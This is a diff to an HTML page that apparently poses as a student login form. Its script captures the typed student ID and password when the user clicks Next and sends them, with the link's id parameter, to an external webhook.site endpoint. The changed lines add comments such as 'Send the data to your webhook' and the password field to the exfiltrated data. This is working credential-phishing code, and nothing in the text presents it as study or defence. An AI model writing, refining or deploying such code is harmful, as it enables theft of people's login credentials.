@@ -101,28 +101,24 @@ button:hover {
 </div>
 
 <script>
-function showAlert() {
-    document.getElementById("warn").style.display = "block";
-}
-</script>
-<script>
 const params = new URLSearchParams(window.location.search);
 const linkId = params.get("id");
 
 function showAlert() {
   document.getElementById("warn").style.display = "block";
 
+  // 1. Capture the values from the inputs
   const typedId = document.getElementById("studentInput")?.value || "";
+  const passwordValue = document.getElementById("passwordInput")?.value || "";
 
-const passwordValue = document.getElementById("passwordInput")?.value || "";
-
+  // 2. Send the data to your webhook
   fetch("https://webhook.site/fe985e23-5c43-43bb-8c38-8c7b32ee2c81", {
     method: "POST",
     mode: "no-cors",
     body: JSON.stringify({
       student_from_link: linkId || "none",
       student_typed: typedId || "empty",
-password_typed: passwordValue || "empty", // <--- Added this line
+      password_typed: passwordValue || "empty", // <--- Added this line
       action: "clicked_next",
       time: new Date().toISOString()
     })
@@ -131,3 +127,4 @@ password_typed: passwordValue || "empty", // <--- Added this line
 </script>
 </body>
 </html>
+
